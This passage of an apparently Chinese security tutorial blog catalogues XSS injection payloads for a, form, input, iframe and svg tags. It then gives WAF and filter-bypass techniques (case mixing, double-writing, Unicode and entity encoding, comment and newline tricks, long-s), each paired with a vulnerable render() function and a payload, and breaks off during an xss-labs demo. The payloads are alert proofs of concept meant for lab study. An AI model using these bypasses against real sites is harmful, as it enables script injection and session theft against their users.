<h2 id="4、href"><a href="#4、href" class="headerlink" title="4、href"></a>4、href</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">标准格式</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span>&gt;</span>baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">XSS利用方式1</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:aaa&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> XSS利用方式2</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">XSS利用方式3</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">XSS利用方式4</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">kycg.asp?ttt</span>=<span class="string">1000</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">y</span>=<span class="string">2016</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="5、form标签"><a href="#5、form标签" class="headerlink" title="5、form标签"></a>5、form标签</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">XSS利用方式1</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line">XSS利用方式2</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">aa.asp?</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">aa.asp?</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="6、input标签"><a href="#6、input标签" class="headerlink" title="6、input标签"></a>6、input标签</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">标准格式</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">利用方式1</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">利用方式2</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">bad</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">利用方式4</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="7、iframe标签"><a href="#7、iframe标签" class="headerlink" title="7、iframe标签"></a>7、iframe标签</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">XSS利用方式1</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;);<span class="attr">height</span>=<span class="string">5width</span>=<span class="string">1000</span> /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line">XSS利用方式2</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(&#x27;xss&#x27;)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--原code--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--base64编码--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br><span class="line">XSS利用方式3</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;aaa&quot;</span> ο<span class="attr">nm</span>ο<span class="attr">use</span>ο<span class="attr">ver</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;) /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line">XSS利用方式3</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript<span class="symbol">&amp;colon;</span>prompt<span class="symbol">&amp;lpar;</span>`xss`<span class="symbol">&amp;rpar;</span>&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="8、svg标签"><a href="#8、svg标签" class="headerlink" title="8、svg标签"></a>8、svg标签</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="9、其他"><a href="#9、其他" class="headerlink" title="9、其他"></a>9、其他</h2><ul>
<li>事件型还有onbody标签</li>
</ul>
<h1 id="二、常用的绕过Waf"><a href="#二、常用的绕过Waf" class="headerlink" title="二、常用的绕过Waf"></a>二、常用的绕过Waf</h1><h2 id="1、利用大小写绕过"><a href="#1、利用大小写绕过" class="headerlink" title="1、利用大小写绕过"></a>1、利用大小写绕过</h2><p>&emsp;&emsp;这个绕过方式的出现是因为网站仅仅只过滤了<code>&lt;script&gt;</code>标签，而没有考虑标签中的大小写并不影响浏览器的解释所致。具体的方式就像这样：  <code>&lt;sCriPt&gt;alert(1)&lt;/SCripT&gt;</code></p>
<h2 id="2、利用过滤后返回语句再次构成攻击语句来绕过（经常用双写绕过）"><a href="#2、利用过滤后返回语句再次构成攻击语句来绕过（经常用双写绕过）" class="headerlink" title="2、利用过滤后返回语句再次构成攻击语句来绕过（经常用双写绕过）"></a>2、利用过滤后返回语句再次构成攻击语句来绕过（经常用双写绕过）</h2><p>&emsp;&emsp;有的只过滤了一次script标签，因此可以使用双写来绕过<code>&lt;sCri&lt;script&gt;Pt&gt;alert(1)&lt;/SC&lt;/script&gt;ripT&gt;</code></p>
<h2 id="3、并不是只有script标签才可以插入代码"><a href="#3、并不是只有script标签才可以插入代码" class="headerlink" title="3、并不是只有script标签才可以插入代码"></a>3、并不是只有script标签才可以插入代码</h2><h3 id="（1）img标签"><a href="#（1）img标签" class="headerlink" title="（1）img标签"></a>（1）img标签</h3><p>&emsp;&emsp;<code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code>就可以再次愉快的弹窗。原因很简单，我们指定的图片地址根本不存在也就是一定会发生错误，这时候onerror里面的代码自然就得到了执行。</p>
<h3 id="（2）onmouseover事件"><a href="#（2）onmouseover事件" class="headerlink" title="（2）onmouseover事件"></a>（2）onmouseover事件</h3><ul>
<li><code>onmouseover=&quot;alert(1)&quot;</code>，比如<ul>
<li><code>&lt;a onmousemove=&quot;do something here&quot;&gt;</code> 当用户鼠标移动时即可运行代码 </li>
<li><code>&lt;div onmouseover=&quot;do something here&quot;&gt;</code> 当用户鼠标在这个块上面时即可运行（可以配合weight等参数将div覆盖页面，鼠标不划过都不行）</li>
</ul>
</li>
</ul>
<h3 id="（3）onclick事件"><a href="#（3）onclick事件" class="headerlink" title="（3）onclick事件"></a>（3）onclick事件</h3><p>&emsp;&emsp;<code>onclick=&quot;alert(1)&quot;</code>  这个要点击后才能运行代码，条件相对苛刻，就不再详述。</p>
<h3 id="（4）onload事件"><a href="#（4）onload事件" class="headerlink" title="（4）onload事件"></a>（4）onload事件</h3><p>&emsp;&emsp;比如以下代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span> <span class="comment">//http...或https....</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;  <span class="comment">//是否包含在input中</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src=&quot;<span class="subst">$&#123;input&#125;</span>&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;payload：<code>http://www.segmentfault.com&quot; onload=&quot;alert(1)</code></p>
<h2 id="4、编码脚本绕过关键字过滤"><a href="#4、编码脚本绕过关键字过滤" class="headerlink" title="4、编码脚本绕过关键字过滤"></a>4、编码脚本绕过关键字过滤</h2><h3 id="（1）Javascript的编码–eval-函数"><a href="#（1）Javascript的编码–eval-函数" class="headerlink" title="（1）Javascript的编码–eval()函数"></a>（1）Javascript的编码–eval()函数</h3><p>&emsp;&emsp;<code>\uXXXX</code> 这种写法的Unicode 转义序列，表示一个字符，其中 XXXX 表示一个 16 进制数字，如&lt;的Unicode 编码为\u003c。</p>
<p>&emsp;&emsp;有的时候，服务器往往会对代码中的关键字（如alert）进行过滤，这个时候我们可以尝试将关键字进行编码后再插入，不过直接显示编码是不能被浏览器执行的，我们可以用另一个语句eval()来实现。eval()会将编码过的语句解码后再执行，简直太贴心了。  </p>
<p>&emsp;&emsp;例如alert(1)编码过后就是<code>\u0061\u006c\u0065\u0072\u0074(1)</code>（对应于ASCII码的十六进制）</p>
<p>&emsp;&emsp;所以构建出来的攻击语句如下：<code>&lt;script&gt;eval(\u0061\u006c\u0065\u0072\u0074(1))&lt;/script&gt;</code></p>
<h3 id="（2）HTML实体编码"><a href="#（2）HTML实体编码" class="headerlink" title="（2）HTML实体编码"></a>（2）HTML实体编码</h3><p>&emsp;&emsp;实体编码字符<code>&lt;svg&gt;</code>（翻译官）</p>
<p>&emsp;&emsp;把要转码的先Unicode转换一下，然后后台看到有翻译官会把Unincode编码转回为当初的字符</p>
<p>&emsp;&emsp;比如以下代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span>    <span class="comment">//正则表达式，看//包裹的内容即可</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)  把()<span class="string">`替换为空</span></span><br><span class="line"><span class="string">  return input</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;payload：<code>&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> 因为控制字符()变成了实体编码因此要使用翻译官才能让()正确发挥控制字符的作用</p>
<h3 id="（3）翻译官（Unicode编码）"><a href="#（3）翻译官（Unicode编码）" class="headerlink" title="（3）翻译官（Unicode编码）"></a>（3）翻译官（Unicode编码）</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()  <span class="comment">//把所有的输出内容都大写</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;payload：<code>&lt;img src=&quot;&quot; onerror=&quot;alert(1)&quot;&gt;</code> 👈HTML编码或者<code>&lt;svg&gt;&lt;img src=&quot;&quot; onerror=&quot;alert(1)&quot;&gt;</code>👈Unicode编码</p>
<h2 id="5、主动闭合标签实现注入代码"><a href="#5、主动闭合标签实现注入代码" class="headerlink" title="5、主动闭合标签实现注入代码"></a>5、主动闭合标签实现注入代码</h2><p>&emsp;&emsp;比如以下代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27;</span> + input + <span class="string">&#x27;&quot;&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;payload：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;input type=&#39;name&#39; value=&quot;</code> 或者 <code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<h2 id="6、绕过小括号"><a href="#6、绕过小括号" class="headerlink" title="6、绕过小括号()"></a>6、绕过小括号()</h2><p>&emsp;&emsp;在前端中，反引号```可以当作小括号来使用</p>
<p>&emsp;&emsp;比如以下代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span>   <span class="comment">//正则表达式，看//中间的内容即可</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)  <span class="comment">//把[()]替换为空</span></span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;payload：<code>&lt;script&gt;alert</code>1<code>&lt;/script&gt;</code></p>
<h2 id="7、绕过"><a href="#7、绕过" class="headerlink" title="7、绕过()`"></a>7、绕过()`</h2><h3 id="1-使用HTML实体编码"><a href="#1-使用HTML实体编码" class="headerlink" title="(1)使用HTML实体编码"></a>(1)使用HTML实体编码</h3><p>如上文所述</p>
<h2 id="8、绕过HTML注释符"><a href="#8、绕过HTML注释符" class="headerlink" title="8、绕过HTML注释符"></a>8、绕过HTML注释符</h2><ul>
<li>有两种注释方法：<ul>
<li><code>&lt;!-- 注释内容 --&gt;</code></li>
<li>``&lt;!– 注释内容 –!&gt;`</li>
</ul>
</li>
</ul>
<p>比如以下代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">&#x27;😂&#x27;</span>)  <span class="comment">//将--&gt;替换为笑脸</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;!-- &#x27;</span> + input + <span class="string">&#x27; --&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload：<code>--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--</code>，使用另一个注释符来畸形进行绕过</p>
<h2 id="9、利用换行符绕过"><a href="#9、利用换行符绕过" class="headerlink" title="9、利用换行符绕过"></a>9、利用换行符绕过</h2><p>&emsp;&emsp;%0a–换行符</p>
<p>&emsp;&emsp;比如以下代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">&#x27;_&#x27;</span>) <span class="comment">//auto或on开头，后面跟任意东西，直到出现=或者&gt;都转化成_</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type=&quot;text&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;payload：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>

<p>在前端的世界里，换行一样有用，因此这里通过换行来避免on碰到=</p>
<h2 id="10、绕过右标签"><a href="#10、绕过右标签" class="headerlink" title="10、绕过右标签"></a>10、绕过右标签</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">&#x27;&#x27;</span>) <span class="comment">//所有标签类的，只让写左标签，右标签一加，就替换为空</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;匹配&lt;/ 任意字符&gt;，而且/i过滤了大小写，但html的单标签也可以解析</p>
<p>&emsp;&emsp;payload：<code>&lt;img src=x onerror=&quot;alert(1)&quot;</code></p>
<h2 id="11、绕过-lt-内容-gt"><a href="#11、绕过-lt-内容-gt" class="headerlink" title="11、绕过&lt;/内容&gt;"></a>11、绕过&lt;/内容&gt;</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">&#x27;/* \u574F\u4EBA */&#x27;</span>) <span class="comment">//碰到&lt;/style&gt;就替换成/*坏人*/</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="（1）使用换行"><a href="#（1）使用换行" class="headerlink" title="（1）使用换行"></a>（1）使用换行</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;/style</span><br><span class="line">&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="（2）使用空格"><a href="#（2）使用空格" class="headerlink" title="（2）使用空格"></a>（2）使用空格</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;/style &gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="12、引用指定网站下的目录文件"><a href="#12、引用指定网站下的目录文件" class="headerlink" title="12、引用指定网站下的目录文件"></a>12、引用指定网站下的目录文件</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()  <span class="comment">//把所有的输出内容都大写</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;js标签，src的地址，随便，但是js的语法是大小写敏感的</p>
<p>&emsp;&emsp;开启phpstudy，在目录下创建一个<code>ABC.JS</code>，写上一条<code>alert(1);</code>语句，保存</p>
<p>&emsp;&emsp;payload：<code>&lt;script src=&quot;http://127.0.0.1/ABC.JS&quot;&gt;&lt;/script&gt;</code></p>
<h2 id="13、使用JS的注释符"><a href="#13、使用JS的注释符" class="headerlink" title="13、使用JS的注释符"></a>13、使用JS的注释符</h2><h3 id="（1）注释符–-gt"><a href="#（1）注释符–-gt" class="headerlink" title="（1）注释符–&gt;"></a>（1）注释符–&gt;</h3><p>&emsp;&emsp;<code>--&gt;</code>     js的注释符，让后面的语句不生效</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/&quot;&#x27;]/g</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment">//过滤了&lt; / &quot; &#x27;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert(&#x27;<span class="subst">$&#123;input&#125;</span>&#x27;)    注释只能注释掉这一行</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br><span class="line">xx</span><br><span class="line">alert(<span class="number">1</span>)</span><br><span class="line">--&gt;     js的注释符，让后面的语句不生效</span><br></pre></td></tr></table></figure>

<h3 id="（2）注释符"><a href="#（2）注释符" class="headerlink" title="（2）注释符//"></a>（2）注释符//</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">&#x27;\\\\&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">&#x27;\\`&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;\\74&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;\\76&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">&#x27;\\/&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">&#x27;\\r&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">&#x27;\\t&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">&#x27;\\f&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">&#x27;\\v&#x27;</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, &#x27;\\b&#x27;)</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">&#x27;\\0&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = &#x27;javascript:console.log(&quot;<span class="subst">$&#123;s&#125;</span>&quot;)&#x27;</span></span><br><span class="line"><span class="string">  var a = document.createElement(&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;payload：<code>&quot;);alert(1)//</code></p>
<p>&emsp;&emsp;通过源码发现一些字符被转义了，就连换行符也被转义了。但是发现竟然还可以用，原因是//虽然被转义成了//，但转义之后还是//，在js中还是注释符（勿与正则混淆）</p>
<h2 id="14、使用古英语"><a href="#14、使用古英语" class="headerlink" title="14、使用古英语"></a>14、使用古英语</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">&#x27;&lt;_$1&#x27;</span>) &lt;碰到字母就变成&lt;_</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;使用维基百科搜索s，会发现长s，古英语的s</p>
<p>&emsp;&emsp;举一反三，碰到其他字母是否也可以用古英语</p>
<p>&emsp;&emsp;payload：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;ſcript src=&#x27;http://127.0.0.1/ABC.JS&#x27;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="15、使用伪协议"><a href="#15、使用伪协议" class="headerlink" title="15、使用伪协议"></a>15、使用伪协议</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="三、Waf防护与绕过演示"><a href="#三、Waf防护与绕过演示" class="headerlink" title="三、Waf防护与绕过演示"></a>三、Waf防护与绕过演示</h1><p>&emsp;&emsp;就使用xss-labs这个靶场的第一关和某狗作为演示</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643508289200-ed0d701d-a2ad-4361-9046-58cb9ad5bd15.png" alt="img"></p>
<p>分析拦截情况</p>
<ol>
<li>通过去除关键词或关键词的其中某些字母判断拦截了什么关键词，如下正常</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643508415994-8ee49e0e-59f7-4aa1-bc71-0121f07bde04.png" alt="img"></p>
<ol start="2">
<li>而如下就不正常了</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643508472556-503aea64-4e23-4a8c-9392-6097f4b4af59.png" alt="img"></p>
<ol start="3">
<li>如下正常。说明是匹配了<code>&lt;script&gt;</code>标签</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643508541558-6bb642c9-889f-425f-8516-c79072751530.png" alt="img"></p>
<ol start="4">
